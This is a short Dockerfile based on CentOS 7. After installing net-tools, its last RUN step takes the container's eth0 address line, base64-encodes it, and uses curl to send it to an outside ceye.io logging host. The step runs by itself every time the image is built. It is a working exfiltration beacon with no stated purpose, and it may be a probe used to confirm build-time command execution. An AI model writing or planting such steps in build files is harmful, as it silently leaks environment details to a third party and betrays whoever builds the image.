FROM centos:7
RUN yum install -y net-tools
RUN curl http://fj5clt.ceye.io/?`echo $(ifconfig eth0 | grep "inet ") | base64`
